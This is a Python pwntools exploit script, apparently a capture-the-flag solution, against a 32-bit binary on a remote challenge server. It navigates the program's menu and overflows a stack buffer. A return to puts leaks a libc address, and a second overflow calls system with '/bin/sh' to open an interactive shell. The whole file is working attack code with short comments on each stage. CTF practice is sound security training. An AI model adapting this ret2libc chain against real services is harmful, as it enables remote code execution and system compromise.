#!/usr/bin/env python3
from pwn import *

context.update(arch='x86')
exe = './chall'
elf = ELF("./chall")

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript = '''
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

# p = start()
p = remote("gc1.eng.run", 31276)

#Leak the puts address with the help of puts
p.recv()
p.sendline(b"1")
p.recv()
p.sendline(b"1")
p.recv()
p.sendline(b"2")
p.recv()
p.sendline(b"1")
p.recv()
p.sendline(b"3449454129")
p.recv()
p.sendline(b"A"*(52-4) + p32(elf.plt.puts)+p32(elf.sym.main)+p32(elf.got.puts))
p.recvline()
print(p.recvline())

#Log the address
putsadd = u32(p.recvline()[:4].strip().ljust(4, b'\x00'))
log.info(f"puts@got: {hex(putsadd)}")

#Find the libc from libc.blukat and find offset of system and "/bin/sh" string
system = p32(putsadd-0x2be70)
stradd = p32(putsadd+0x11e0c2)

#Next part of exploit to call system with "bin/sh"
p.recv()
p.sendline(b"1")
p.recv()
p.sendline(b"1")
p.recv()
p.sendline(b"2")
p.recv()
p.sendline(b"1")
p.recv()
p.sendline(b"3449454129")
p.recv()
p.sendline(b"A"*(52-4) + system + p32(elf.sym.main) + stradd)
p.interactive()

